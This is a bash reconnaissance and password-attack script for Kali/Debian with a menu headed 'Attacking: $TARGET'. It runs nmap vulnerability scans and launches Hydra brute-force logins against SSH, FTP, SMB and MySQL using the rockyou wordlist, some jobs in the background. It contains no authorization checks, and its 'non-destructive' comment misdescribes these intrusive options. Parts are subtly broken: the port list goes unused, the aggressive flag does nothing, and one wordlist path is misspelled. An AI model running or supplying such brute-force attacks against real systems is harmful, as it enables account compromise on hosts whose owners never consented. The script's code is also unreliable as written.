#!/usr/bin/env bash
set -euo pipefail

# Recon script for Debian/Kali — non-destructive by default.
# Usage: sudo ./run_script.sh
# Options: --target IP --aggressive (optional, more intrusive checks)

TARGET=""
AGGRESSIVE=0
REPORT_DIR="reports"
PORTS="22,21,80,443,53,3306,9090,1514,1515"


# parse args
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target) TARGET="$2"; shift 2;;
    --aggressive) AGGRESSIVE=1; shift 1;;
  esac
done

if [[ -z "$TARGET" ]]; then
  read -rp "Target IPv4 (local) > " TARGET
fi

if [[ -z "$TARGET" ]]; then
  echo "No target provided. Exiting."; exit 1
fi
log(){
  echo "[$(date '+%F %T')] $*" | tee -a "$OUTDIR/run.log"
}

TIMESTAMP=$(date +%Y%m%d-%H%M%S)
OUTDIR="$REPORT_DIR/${TARGET}_$TIMESTAMP"
mkdir -p "$OUTDIR"
mkdir -p "$OUTDIR/nmap"
mkdir -p "$OUTDIR/hydra"

echo "Directorio Reporte: $OUTDIR"

echo "Trying downloading apt dependencies if not present..."
sudo apt update && sudo apt install -y nmap hydra parallel openssl wordlists
echo "Extracting rockyou.txt if not present..."
if [[ ! -f "/usr/share/wordlists/rockyou.txt" ]]; then
  echo "No present, downloading and extracting rockyou.txt..."
  wget https://weakpass.com/download/90/rockyou.txt.gz -O /tmp/rockyou.txt.gz
  gunzip -c /tmp/rockyou.txt.gz > /usr/share/wordlists/rockyou.txt
  rm /tmp/rockyou.txt.gz
fi


while true; do
  cat <<EOF

Attacking: $TARGET

Menu:
1) nmap default (common ports)
2) nmap vuln (vuln scripts)
3) Run both nmap scans in parallel
4) Hydra SSH attack (rockyou.txt)
5) Hydra FTP attack (rockyou.txt)
6) Hydra SMB attack (rockyou.txt)
7) Hydra MySQL attack (rockyou.txt)
8) All Hydra attacks in parallel
9) Fetch SSL certificate (443)
10) Exit

EOF

  read -rp "Choose an option > " OPTION
  case "$OPTION" in
    1)
      log "Running nmap default scripts on common ports: $PORTS"
      sudo nmap -Pn -sV --script default -oA "$OUTDIR/nmap/default" "$TARGET"
      ;;
    2)
      log "Running nmap vuln scripts on common ports: $PORTS"
      sudo nmap -Pn -sV --script vuln -oA "$OUTDIR/nmap/vuln" "$TARGET" 
      ;;
    3)
      log "Running both nmap scans in parallel"
      sudo nmap -Pn -sV --script default -oA "$OUTDIR/nmap/default" "$TARGET" | tee -a "$OUTDIR/run_default.log" &
      pid1=$!
      sudo nmap -Pn -sV --script vuln -oA "$OUTDIR/nmap/vuln" "$TARGET" | tee -a "$OUTDIR/run_vuln.log" &
      pid2=$!
      echo "Started scans: $pid1 and $pid2 — waiting..."
      wait $pid1 $pid2
      echo "Both scans finished."
      ;;
    4)
      log "Start Hydra SSH attack in background"
      nohup hydra -L /usr/share/wordlist/john.lst -P /usr/share/wordlists/rockyou.txt -f -o "$OUTDIR/hydra_ssh.txt" -u "$TARGET" ssh > "$OUTDIR/hydra_ssh.log" 2>&1 &
      ;;
    5)
      log "Start Hydra FTP attack in background"
      nohup hydra -L /usr/share/wordlist/john.lst -P /usr/share/wordlists/rockyou.txt -f -o "$OUTDIR/hydra_ftp.txt" -u "$TARGET" ftp > "$OUTDIR/hydra_ftp.log" 2>&1 &
      ;;
    6)
      log "Start Hydra SMB attack in background"
      nohup hydra -L /usr/share/wordlist/john.lst -P /usr/share/wordlists/rockyou.txt -f -o "$OUTDIR/hydra_smb.txt" -u "$TARGET" smb > "$OUTDIR/hydra_smb.log" 2>&1 &
      ;;
    7)
      log "Start Hydra MySQL attack in background"
      nohup hydra -L /usr/share/wordlist/john.lst -P /usr/share/wordlists/sqlmap.txt -f -o "$OUTDIR/hydra_mysql.txt" -u "$TARGET" mysql > "$OUTDIR/hydra_mysql.log" 2>&1 &
      ;;
    8)
      log "All Hydra attacks started in background"
      parallel --jobs 4 ::: \
        "hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o \"$OUTDIR/hydra/ssh.txt\" -u \"$TARGET\" ssh" \
        "hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o \"$OUTDIR/hydra/ftp.txt\" -u \"$TARGET\" ftp" \
        "hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o \"$OUTDIR/hydra/smb.txt\" -u \"$TARGET\" smb" \
        "hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o \"$OUTDIR/hydra/mysql.txt\" -u \"$TARGET\" mysql"
      ;;
    9)
      log "Fetching SSL certificate from $TARGET:443"
      echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | openssl x509 -noout -text > "$OUTDIR/ssl_443_cert.txt" || true
      ;;
    10)
      log "Exiting."; exit 0
      ;;
    *) echo "Unknown option: $OPTION";;
  esac
done
